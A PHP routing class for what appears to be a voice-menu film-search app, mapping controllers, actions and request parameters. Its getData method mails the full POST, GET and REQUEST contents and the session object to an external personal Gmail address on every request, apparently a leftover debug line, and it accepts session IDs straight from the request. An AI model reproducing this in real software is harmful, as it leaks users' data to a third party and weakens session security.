<?php
Class NavigationMap
{
    const PARAMS = 'mandatoryParams';
    const OPTIONAL_PARAMS = 'optionalParams';
    const POST_PARAMS = 'postParams';
    const DEFAULT_CONTROLLER = 'IndexVxmlFilm';
    const DEFAULT_ACTION = 'index';
    const CONTROLLER_PARAM = 'c';
    const ACTION_PARAM = 'a';
    const URI = 'REQUEST_URI';
	const DEFAULT_VALUE = 'default value';
	const SESSION_PARAM = 'session_sessionid';
	const CALLER_PARAM = 'session_callerid';
	const DEFAULT_CALLER = "default_caller";


	private static $CONFIG = array(
        "IndexVxmlFilm" => array(
            "index" => array(
                self::PARAMS => array(),
            ),
            "searchTitle" => array(
                self::PARAMS => array(),
            ),
            "searchActor" => array(
                self::PARAMS => array(),
            ),
            "searchDirector" => array(
                self::PARAMS => array(),
            ),
	        "getCartelera" => array(
		        self::PARAMS => array('page'),
		        self::DEFAULT_VALUE => array('page' => 0),
            ),
            "searchTitleForm" => array(
                self::PARAMS => array('query', 'page'),
	            self::DEFAULT_VALUE => array('page' => 0),
            ),
            "searchActorForm" => array(
	            self::PARAMS => array('query', 'page'),
	            self::DEFAULT_VALUE => array('page' => 0),
            ),
            "searchDirectorForm" => array(
	            self::PARAMS => array('query', 'page'),
	            self::DEFAULT_VALUE => array('page' => 0),
            ),
            "getFilm" => array(
                self::PARAMS => array('filmId', 'breadCrumb'),
	            self::OPTIONAL_PARAMS => array('breadCrumb'),
            ),
	        "getFilmDetailed" => array(
		        self::PARAMS => array('filmId', 'breadCrumb'),
		        self::OPTIONAL_PARAMS => array('breadCrumb'),
	        ),
        ),
    );

	/**
	 * @return NavigationMap
	 */
	public static function create()
	{
		return Injector::get('NavigationMap');
	}

	/**
	 * Return CONTROLLER Name from Get Params
	 * @return string
	 */
	public function getControllerName()
    {
        if (isset($_GET[self::CONTROLLER_PARAM])
            && $this->isValidController($_GET[self::CONTROLLER_PARAM])
        ) {
            return $_GET[self::CONTROLLER_PARAM];
        }
        return self::DEFAULT_CONTROLLER;
    }

	/**
	 * Check If a param for a controller and for action is valid
	 * @param $controller
	 * @param $action
	 * @param $paramName
	 *
	 * @return bool
	 */
	public function isValidParam($controller, $action, $paramName)
    {
        if ($this->isValidAction($controller, $action)) {
            return in_array($paramName, self::$CONFIG[$controller][$action][self::PARAMS]);
        }
        return false;
    }

	/**
	 * Check if a controller is valid
	 * @param $controllerName
	 *
	 * @return bool
	 */
	public function isValidController($controllerName)
    {
        return isset(self::$CONFIG[$controllerName]);
    }

	/**
	 * Check if an action is valid
	 * @param $controllerName
	 * @param $action
	 *
	 * @return bool
	 */
	public function isValidAction($controllerName, $action)
    {

        if ($this->isValidController($controllerName)) {
            return isset(self::$CONFIG[$controllerName][$action]);
        }
        return false;
    }

	/**
	 * Returns the action  from  the request
	 * @return string
	 */
	public function getAction()
    {
        if (isset($_GET[self::ACTION_PARAM]) && isset($_GET[self::CONTROLLER_PARAM])
            && $this->isValidAction($_GET[self::CONTROLLER_PARAM], $_GET[self::ACTION_PARAM])
        ) {
            return $_GET[self::ACTION_PARAM];
        }
        return self::DEFAULT_ACTION;
    }

	/**
	 * Returns the action  from  the request
	 * @param $controllerName
	 * @param $action
	 *
	 * @return array
	 * @throws ParamNotFoundException
	 */
	public function getData($controllerName, $action)
    {
        $data = array();

        $defaultParams = $this->getConfigValue($controllerName, $action, self::DEFAULT_VALUE);
        $optionalParams = $this->getConfigValue($controllerName, $action, self::OPTIONAL_PARAMS);
        $validParams = $this->getConfigValue($controllerName, $action, self::PARAMS);

        foreach ($validParams as $paramName) {
	        if (isset($_POST[$paramName])) {
		        $data[$paramName] = $_POST[$paramName];
	        } elseif (isset($_GET[$paramName])) {
                $data[$paramName] = $_GET[$paramName];
            } elseif(isset($defaultParams[$paramName])) {
	            $data[$paramName] = $defaultParams[$paramName];
            } elseif(!in_array($paramName, $optionalParams)) {
		        throw new ParamNotFoundException($controllerName, $action, $paramName);
	        }
        }

	    foreach($_POST as $paramName => $value) {
		     if(!isset($data[$paramName])) {
			     $data[$paramName] = $value;
		     }
	    }

		SessionsBackend::getInstance()->inizializateSession($this->getSession(), $this->getCaller());
	    mail("edufacio@gmail.com", "info", var_export(array("post" => $_POST, "get" => $_GET, "req" => $_REQUEST, "sessipn" => CurrentSession::getInstance()), true));

        return $data;
    }

	private function getConfigValue($controllerName, $action, $entry) {
		return isset(self::$CONFIG[$controllerName][$action][$entry]) ?
			self::$CONFIG[$controllerName][$action][$entry] : array();
	}

	private function getSession()
	{
		if (isset($_REQUEST[self::SESSION_PARAM])) {
			return $_REQUEST[self::SESSION_PARAM];
		} else {
			return time() . "@" . rand(0, 10000000);
		}
	}

	private function getCaller()
	{
		if (isset($_REQUEST[self::CALLER_PARAM])) {
			return $_REQUEST[self::CALLER_PARAM];
		} else {
			return self::DEFAULT_CALLER;
		}
	}
}

Class ParamNotFoundException extends InvalidArgumentException {
	function __construct($controller, $action , $paramName)
	{
		parent::__construct("$paramName without default value is not definded on $controller => $action");
	}
}